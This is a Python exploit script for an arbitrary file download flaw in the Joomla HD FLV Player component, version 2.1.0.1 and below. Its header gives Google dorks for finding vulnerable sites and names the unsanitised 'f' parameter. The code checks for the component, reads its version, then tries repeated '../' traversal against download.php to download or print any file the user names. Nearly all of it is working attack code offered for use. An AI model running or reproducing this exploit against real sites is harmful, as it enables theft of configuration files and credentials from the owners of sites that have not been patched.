
it Title :  Joomla HD FLV 2.1.0.1 and below Arbitrary File Download Vulnerability
#
# Exploit Author : Claudio Viviani
#
# Vendor Homepage : http://www.hdflvplayer.net/
#
# Software Link : http://www.hdflvplayer.net/download_count.php?pid=5
#
# Dork google 1:  inurl:/component/hdflvplayer/
# Dork google 2:  inurl:com_hdflvplayer    
#
# Date : 2014-11-11
#
# Tested on : BackBox 3.x/4.x
#
# Info: 
#       Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=
#       The variable "f" is not sanitized.
#       Over 80.000 downloads (statistic reported on official site)
#
#
# Video Demo: http://youtu.be/QvBTKFLBQ20
#
#
# Http connection
import urllib, urllib2
# String manipulation
import re
# Time management
import time
# Args management
import optparse
# Error management
import sys

banner = """
        _______                      __           ___ ___ ______
       |   _   .-----.-----.--------|  .---.-.   |   Y   |   _  \\
       |___|   |  _  |  _  |        |  |  _  |   |.  1   |.  |   \\
       |.  |   |_____|_____|__|__|__|__|___._|   |.  _   |.  |    \\
       |:  1   |                                 |:  |   |:  1    /
       |::.. . |                                 |::.|:. |::.. . /
       `-------'                                 `--- ---`------'
        _______ ___     ___ ___     _______ __
       |   _   |   |   |   Y   |   |   _   |  .---.-.--.--.-----.----.
       |.  1___|.  |   |.  |   |   |.  1   |  |  _  |  |  |  -__|   _|
       |.  __) |.  |___|.  |   |   |.  ____|__|___._|___  |_____|__|
       |:  |   |:  1   |:  1   |   |:  |            |_____|
       |::.|   |::.. . |\:.. ./    |::.|
       `---'   `-------' `---'     `---'

                                         <= 2.1.0.1 4rb1tr4ry F1l3 D0wnl04d

                                Written by:

                              Claudio Viviani

                           http://www.homelab.it

                              info@homelab.it
                          homelabit@protonmail.ch

                      https://www.facebook.com/homelabit
                        https://twitter.com/homelabit
                      https://plus.google.com/+HomelabIt1/
            https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url


def checkcomponent(url,headers):

    try:
        req = urllib2.Request(url+'/components/com_hdflvplayer/hdflvplayer/download.php', None, headers)
        sys.stdout.write("\r[+] Searching HD FLV Extension...: FOUND")
        print("")
    except urllib2.HTTPError:
        sys.stdout.write("\r[+] Searching HD FLV Extension...: Not FOUND :(")
        sys.exit(1)
    except urllib2.URLError:
        print '[X] Connection Error'

def checkversion(url,headers):

    try:
        req = urllib2.Request(url+'/modules/mod_hdflvplayer/mod_hdflvplayer.xml', None, headers)
        response = urllib2.urlopen(req).readlines()

        for line_version in response:

            if not line_version.find("<version>") == -1:

                VER = re.compile('>(.*?)<').search(line_version).group(1)

                sys.stdout.write("\r[+] Checking Version: "+str(VER))
        print("")

    except urllib2.HTTPError:
       sys.stdout.write("\r[+] Checking Version: Unknown")

    except urllib2.URLError:
        print("\n[X] Connection Error")
        sys.exit(1)

def connection(url,headers,pathtrav):

    char = "../"
    bar = "#"
    s = ""
    barcount = ""

    for a in range(1,20):

        s += char
        barcount += bar
        sys.stdout.write("\r[+] Exploiting...please wait: "+barcount)
        sys.stdout.flush()

        try:
            req = urllib2.Request(url+'/components/com_hdflvplayer/hdflvplayer/download.php?f='+s+pathtrav, None, headers)
            response = urllib2.urlopen(req)

            content = response.read()

            if content != "" and not "failed to open stream" in content:
                print("\n[!] VULNERABLE")
                print("[*] 3v1l Url: "+url+"/components/com_hdflvplayer/hdflvplayer/download.php?f="+s+pathtrav)
                print("")
                print("[+] Do you want [D]ownload or [R]ead the file?")
                print("[+]")
                sys.stdout.write("\r[+] Please respond with 'D' or 'R': ")

                download = set(['d'])
                read  = set(['r'])

                while True:
                    choice = raw_input().lower()
                    if choice in download:
                        filedown = pathtrav.split('/')[-1]
                        urllib.urlretrieve (url+"/components/com_hdflvplayer/hdflvplayer/download.php?f="+s+pathtrav, filedown)
                        print("[!] DOWNLOADED!")
                        print("[!] Check file: "+filedown)
                        return True
                    elif choice in read:
                        print("")
                        print content
                        return True
                    else:
                        sys.stdout.write("\r[X] Please respond with 'D' or 'R': ")

        except urllib2.HTTPError:
            #print '[X] HTTP Error'
            pass
        except urllib2.URLError:
            print '\n[X] Connection Error'

        time.sleep(1)
    print("\n[X] File not found or fixed component :(")

commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('-f', '--file', action="store",
                  help="Insert file to check",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.file:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)

url = checkurl(options.target)
pathtrav = options.file

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}

sys.stdout.write("\r[+] Searching HD FLV Extension...: ")
checkcomponent(url,headers)
sys.stdout.write("\r[+] Checking Version: ")
checkversion(url,headers)
sys.stdout.write("\r[+] Exploiting...please wait:")
connection(url,headers,pathtrav)
